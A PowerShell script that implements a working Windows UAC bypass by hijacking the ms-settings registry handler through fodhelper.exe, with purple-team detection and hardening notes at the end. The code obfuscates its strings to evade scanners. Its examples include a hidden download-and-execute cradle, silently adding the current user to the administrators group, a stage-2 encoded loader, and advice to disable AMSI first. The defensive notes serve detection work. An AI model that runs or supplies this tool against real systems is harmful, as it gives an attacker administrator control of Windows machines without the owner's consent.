<#
.SYNOPSIS
    UAC bypass via fodhelper.exe registry handler hijack (UACME Methods 33 / 67).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ fodhelper.exe (Feature-On-Demand Helper) carries an autoElevate flag    │
    │ in its application manifest.  When launched by a Medium-integrity       │
    │ process, Windows auto-elevates it to High integrity without presenting  │
    │ a UAC consent dialog (default UAC configuration).                       │
    │                                                                         │
    │ At startup, fodhelper reads the ms-settings: URI handler from the       │
    │ registry.  Windows resolves shell-class handlers by checking            │
    │ HKCU\Software\Classes BEFORE HKLM\SOFTWARE\Classes.  Because HKCU is   │
    │ writable by the current Medium-integrity user, we can plant a malicious │
    │ handler that fodhelper's elevated process will execute.                 │
    │                                                                         │
    │ Registry path written:                                                  │
    │   HKCU:\Software\Classes\ms-settings\Shell\Open\command                │
    │     (Default)       = <Payload>                                         │
    │     DelegateExecute = ""   ← presence prevents COM delegation;         │
    │                              shell falls back to the Default string     │
    └─────────────────────────────────────────────────────────────────────────┘

    Method variants:
      33 – Original (Enigma0x3 / winscripting.blog, 2017) – launches fodhelper.exe
           directly; process auto-elevates via manifest.
      67 – Protocol variant (AzAgarampur) – triggers the ms-settings: URI via
           Start-Process "ms-settings:" which causes an auto-elevated broker to
           resolve the handler; same registry key, slightly different trigger path.

    Affected OS    : Windows 10 TH1 (build 10240) → Windows 11 24H2 (build 26100)
                     Status: UNFIXED as of UACME v3.6.9 (Dec 2025)
    UAC level      : Works at default (ConsentPromptBehaviorAdmin = 5)
                     Does NOT work under "Always Notify" (value 2)
    Architecture   : x64 target (fodhelper.exe is 64-bit only)
    Disk artefacts : None — registry key is cleaned up post-execution
    Memory only    : Yes — no binary dropped to disk

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry create: HKCU\Software\Classes\ms-settings\Shell\Open\command
      (Sysmon Event ID 13; CS Registry Activity; SACL audit)
    • Process tree: fodhelper.exe spawning an unexpected child
      (fodhelper normally has no child processes)
    • ETW / AmsiScanBuffer: PowerShell script-block content logging
    • CrowdStrike indicator: INDICATOR_OF_ATTACK_UAC_BYPASS_FODHELPEREXE

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK
    ──────────────────────────────────────────────────────────────────────────
    Tactic         : Privilege Escalation
    Technique      : T1548.002 – Abuse Elevation Control Mechanism: Bypass UAC

    ──────────────────────────────────────────────────────────────────────────
    Reference
    ──────────────────────────────────────────────────────────────────────────
    https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
    https://github.com/hfiref0x/UACME (Method 33, Method 67)

.PARAMETER Payload
    Command to execute with High integrity.
    Examples:
      "cmd.exe"
      "powershell.exe -NoP -W Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('...')`""
      "C:\Windows\System32\cmd.exe /c net localgroup administrators $env:USERNAME /add"

.PARAMETER UseProtocolVariant
    If specified, uses the Method-67 protocol trigger (Start-Process ms-settings:)
    instead of launching fodhelper.exe directly (Method 33).
    The underlying registry manipulation is identical; only the trigger differs.

.PARAMETER Timeout
    Seconds to wait for the elevated process to spawn before cleanup (default: 4).

.EXAMPLE
    # Basic — elevated command prompt
    Invoke-FodHelperBypass -Payload "cmd.exe"

.EXAMPLE
    # Silent net user add using the protocol variant
    $cmd = "cmd.exe /c net localgroup administrators $env:USERNAME /add"
    Invoke-FodHelperBypass -Payload $cmd -UseProtocolVariant

.EXAMPLE
    # In-memory download-exec (combine with your stage-2 loader)
    $cmd = 'powershell.exe -NoP -W Hidden -EncodedCommand <base64>'
    Invoke-FodHelperBypass -Payload $cmd -Timeout 6

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
    AMSI mitigation and preflight checks (Invoke-AMSIMitigation,
    Invoke-PreflightGate).
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [switch]$UseProtocolVariant,
    [int]   $Timeout = 4
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── Key setup ─────────────────────────────────────────────────────────
$xRoot = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
$xCls  = 'ms-set' + 'tings'
$xPath = $xRoot + $xCls + '\Shell\Open\command'

try {
    New-Item -Path $xPath -Force | Out-Null
    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
                      -PropertyType String -Force | Out-Null
    Write-Verbose '[FodHelper] Registry key written.'
}
catch {
    Write-Warning "[FodHelper] Registry write failed: $_"
    return
}
#endregion

#region ── Trigger ───────────────────────────────────────────────────────────
try {
    if ($UseProtocolVariant) {
        # Method 67: trigger via protocol URI — the OS broker resolves the
        # ms-settings: handler using our poisoned HKCU key
        $xUri = 'ms-' + 'set' + 'tings:'
        Start-Process $xUri -ErrorAction Stop
    }
    else {
        # Method 33: launch fodhelper.exe directly; it auto-elevates and
        # reads HKCU\Software\Classes\ms-settings on startup
        $xBin = $env:SystemRoot + '\System32\fo' + 'dhel' + 'per.exe'
        Start-Process -FilePath $xBin -WindowStyle Hidden -ErrorAction Stop
    }
    Start-Sleep -Seconds $Timeout
    Write-Verbose '[FodHelper] Trigger dispatched — payload should have executed.'
}
catch {
    Write-Warning "[FodHelper] Trigger failed: $_"
}
finally {
    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
    Write-Verbose '[FodHelper] Registry cleanup complete.'
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

EXPECTED DETECTIONS (CS Falcon + Sysmon):
  ● Registry: HKCU\Software\Classes\ms-settings\Shell\Open\command created
    → Sysmon EID 13 (RegistryValueSet)
    → CS "Registry Activity" / RAP-enabled alert
  ● Process: fodhelper.exe → <payload> parent-child anomaly
    → CS Behavior Graph — Process Tree Anomaly
    → CS indicator: INDICATOR_OF_ATTACK_UAC_BYPASS_FODHELPEREXE

WHAT MAY EVADE (purple-team gap analysis):
  ● If payload is a signed binary (e.g. powershell.exe, mshta.exe) the
    process-creation telemetry may not immediately flag it without
    behavioural follow-on analysis.
  ● Short-lived key (created→deleted within <Timeout> seconds) may miss
    slow scan windows.

HARDENING RECOMMENDATIONS:
  ● Enable SACL audit on HKCU\Software\Classes (Event ID 4657)
  ● Sysmon Rule: RegistryEvent targeting ms-settings\Shell\Open\command
  ● UAC level: "Always Notify" (ConsentPromptBehaviorAdmin = 2) blocks this
  ● CS Custom IOA: registry key set pattern + fodhelper.exe child spawn

════════════════════════════════════════════════════════════════════════════════
#>
